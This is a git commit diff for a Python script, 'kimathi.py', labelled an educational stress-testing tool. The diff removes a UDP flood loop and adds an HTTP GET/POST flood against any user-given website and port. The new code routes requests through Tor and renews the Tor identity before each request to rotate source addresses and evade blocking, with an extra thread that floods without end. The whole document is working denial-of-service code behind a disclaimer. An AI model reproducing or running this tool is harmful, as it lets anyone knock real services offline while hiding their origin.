538fd785e12fb790b5d45d7cc82857000edc8a0f
wizaad <jongeek47@gmail.com>
2023-08-08 19:46:10 +0300

    last edition tor kimathi

--- kimathi.py
+++ kimathi.py
@@ -1,52 +1,105 @@
+import argparse
 import socket
 import random
 import sys
 import os
 import time
 from time import sleep
+from threading import Thread
+from concurrent.futures import ThreadPoolExecutor
+import requests
+from stem import Signal
+from stem.control import Controller
+import idna
 
+def parse_arguments():
+    parser = argparse.ArgumentParser(description="Advanced stress-testing tool for cyber security purposes.")
+    parser.add_argument("-t", "--target", type=str, help="Target website or IP address", required=True)
+    parser.add_argument("-p", "--port", type=int, help="Target port", required=True)
+    parser.add_argument("-d", "--duration", type=int, help="Test duration in seconds", required=True)
+    parser.add_argument("-s", "--size", type=int, help="Packet size in bytes", default=1024)
+    return parser.parse_args()
 
-print('''
-  ________                                  .__           ____  __.__                __  .__    .__ 
- /  _____/  ____   ____   ________________  |  |         |    |/ _|__| _____ _____ _/  |_|  |__ |__|
-/   \  ____/ __ \ /    \_/ __ \_  __ \__  \ |  |         |      < |  |/     \\__  \\   __\  |  \|  |
-\    \_\  \  ___/|   |  \  ___/|  | \// __ \|  |__       |    |  \|  |  Y Y  \/ __ \|  | |   Y  \  |
- \______  /\___  >___|  /\___  >__|  (____  /____/       |____|__ \__|__|_|  (____  /__| |___|  /__|
-        \/     \/     \/     \/           \/                     \/        \/     \/          \/    
-                             https://github.com/Wizaad/kimathi
-                               https://twitter.com/MrWizaad
-''')
-print('*' * 99)
+def renew_tor_identity():
+    with Controller.from_port(port=9051) as controller:
+        controller.authenticate()
+        controller.signal(Signal.NEWNYM)
 
-description = "In memories of Dedan Kimathi, This tool is for educational purpose only! It a python based stress test"\
-              "tool. \n "
-for _ in description:
-    sleep(0.1)
-    sys.stdout.write(_)
-    sys.stdout.flush()
-
-sleep(3)
-print("!" * 99)
-byte = random._urandom(1024)
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-os.system("clear")
-target = input('Enter your target website: ')
-ip = socket.gethostbyname(target)
-port = int(input('Enter Port: '))
-duration = int(input("Enter duration: "))
-timeout = time.time() + duration
-sent = 0
-
-while True:
+def send_packet(target, port, packet_size):
+    renew_tor_identity()
+    session = requests.Session()
+    session.proxies = {
+        'http': 'socks5://localhost:9050',
+        'https': 'socks5://localhost:9050'
+    }
+    headers = {'Host': target, 'User-Agent': 'Mozilla/5.0'}
+    data = random._urandom(packet_size)
     try:
-        if time.time() > timeout:
-            break
-        else:
-            pass
-        sock.sendto(byte, (ip, port))
-        sent += 1
-        print("Sent", sent, "packets to", ip, "through", port,)
+        session.get(f"http://{target}:{port}", headers=headers, timeout=5)
+        session.post(f"http://{target}:{port}", headers=headers, data=data, timeout=5)
+    except Exception as e:
+        pass
 
-    except KeyboardInterrupt:
-        sys.exit()
-print('End of testing...')
+def hold_packets(target, port, packet_size):
+    while True:
+        send_packet(target, port, packet_size)
+        time.sleep(0.01)
+
+def main():
+    print('''
+      ________                                  .__           ____  __.__                __  .__    .__ 
+     /  _____/  ____   ____   ________________  |  |         |    |/ _|__| _____ _____ _/  |_|  |__ |__|
+    /   \  ____/ __ \ /    \_/ __ \_  __ \__  \ |  |         |      < |  |/     \\__  \\   __\  |  \|  |
+    \    \_\  \  ___/|   |  \  ___/|  | \// __ \|  |__       |    |  \|  |  Y Y  \/ __ \|  | |   Y  \  |
+     \______  /\___  >___|  /\___  >__|  (____  /____/       |____|__ \__|__|_|  (____  /__| |___|  /__|
+            \/     \/     \/     \/           \/                     \/        \/     \/          \/    
+                                 https://github.com/Wizaad/kimathi
+                                   https://twitter.com/MrWizaad
+    ''')
+    print('*' * 99)
+
+    args = parse_arguments()
+    target = args.target
+    port = args.port
+    duration = args.duration
+    packet_size = args.size
+
+    print("This is an advanced stress-testing tool designed for cyber security purposes.")
+
+    description = "In memories of Dedan Kimathi, This tool is for educational purpose only! It is a python-based stress test tool.\n"
+    for char in description:
+        sleep(0.1)
+        sys.stdout.write(char)
+        sys.stdout.flush()
+
+    sleep(3)
+    print("!" * 99)
+
+    timeout = time.time() + duration
+    sent = 0
+
+    hold_thread = Thread(target=hold_packets, args=(target, port, packet_size))
+    hold_thread.start()
+
+    while True:
+        try:
+            if time.time() > timeout:
+                break
+
+            send_packet(target, port, packet_size)
+            sent += 1
+            print("Sent packet", sent, "to", target, "through port", port, "with size", packet_size, "bytes")
+
+            # Perform any additional actions here
+
+            time.sleep(1)
+
+        except KeyboardInterrupt:
+            break
+
+    hold_thread.join()
+
+    print('End of testing...')
+
+if __name__ == "__main__":
+    main()
